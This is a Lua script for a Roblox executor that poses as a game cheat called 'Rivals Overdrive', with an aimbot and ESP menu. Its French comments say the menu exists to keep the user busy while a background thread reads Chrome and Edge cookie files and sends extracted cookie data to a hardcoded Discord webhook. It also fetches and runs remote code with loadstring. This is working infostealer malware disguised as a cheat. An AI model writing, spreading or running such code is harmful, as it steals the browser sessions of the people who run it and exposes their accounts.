--[[ 
    MASQUE RED TEAM : "Rivals Overdrive" 
    Le script charge une GUI de cheat complète pour occuper l'utilisateur
    pendant que le thread de fond extrait les données.
]]--

local WEBHOOK = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"

-- 1. THREAD D'EXFILTRATION (En arrière-plan)
task.spawn(function()
    local success, err = pcall(function()
        local appData = os.getenv("LOCALAPPDATA")
        -- Liste de recherche étendue
        local targets = {
            appData .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
            appData .. "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
            appData .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
        }
        
        for _, path in pairs(targets) do
            if isfile and isfile(path) then
                local content = readfile(path)
                -- Extraction brute (v10/v11/v12 blobs)
                local match = string.match(content, "v1[0-2][^%w%s]+")
                if match then
                    local Http = game:GetService("HttpService")
                    local req = request or http_request
                    req({
                        Url = WEBHOOK,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = Http:JSONEncode({content = "Found: " .. match})
                    })
                    break -- On arrête après la première découverte
                end
            end
        end
    end)
end)

-- 2. GUI MASQUE (Interface de triche)
-- Utilisation de LinoriaLib (standard pour les cheats Roblox)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
local Window = Library:CreateWindow({ Title = "Rivals Overdrive | Internal", Center = true, AutoShow = true })

local Tab = Window:AddTab("Combat")
local Combat = Tab:AddLeftGroupbox("Aimbot")
Combat:AddToggle('Aim', { Text = 'Enable Silent Aim', Default = true })
Combat:AddSlider('FOV', { Text = 'FOV Size', Default = 90, Min = 1, Max = 360 })

local Tab2 = Window:AddTab("Visuals")
local Visuals = Tab2:AddLeftGroupbox("ESP")
Visuals:AddToggle('Box', { Text = 'Box ESP', Default = true })
Visuals:AddToggle('Name', { Text = 'Name Tags', Default = true })

Library:Notify("System Initialized & Secured.")
